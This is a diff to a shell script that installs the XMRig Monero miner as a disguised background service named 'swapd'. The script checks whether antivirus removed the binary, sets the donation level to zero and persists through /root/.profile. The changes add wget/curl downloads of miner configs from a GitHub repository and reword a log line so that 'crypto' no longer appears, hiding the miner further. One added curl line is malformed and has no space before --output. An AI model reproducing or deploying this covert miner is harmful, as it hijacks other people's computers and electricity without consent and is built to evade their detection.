@@ -260,7 +260,6 @@ if ! tar xf /tmp/xmrig.tar.gz -C $MOHOME/; then
   exit 1
 fi
 rm /tmp/xmrig.tar.gz
-mv $MOHOME/[crypto].pid $MOHOME/swapd.pid
 
 echo "[*] Checking if advanced version of $MOHOME/xmrig works fine (and not removed by antivirus software)"
 sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $MOHOME/swapd.pid
@@ -347,11 +346,10 @@ sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $MOHOME/swapd.pid
 
 #wget --no-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
 wget https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
-
 curl https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json --output $MOHOME/config.json
 
-cp $MOHOME/config.json $MOHOME/config_background.json
-sed -i 's/"background": *false,/"background": true,/' $MOHOME/.swapd/config_background.json
+wget https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config_background.json
+curl https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config_background.json--output $MOHOME/config_background.json
 
 # preparing script
 killall xmrig
@@ -378,7 +376,7 @@ if ! sudo -n true 2>/dev/null; then
   else 
     echo "Looks like $MOHOME/swapd.sh script is already in the /root/.profile"
   fi
-  echo "[*] Running crypto service in the background (see logs in $MOHOME/swapd.log file)"
+  echo "[*] Running swapd service in the background (see logs in $MOHOME/swapd.log file)"
   /bin/bash $MOHOME/swapd.sh --config=$MOHOME/config_background.json >/dev/null 2>&1
 else
 
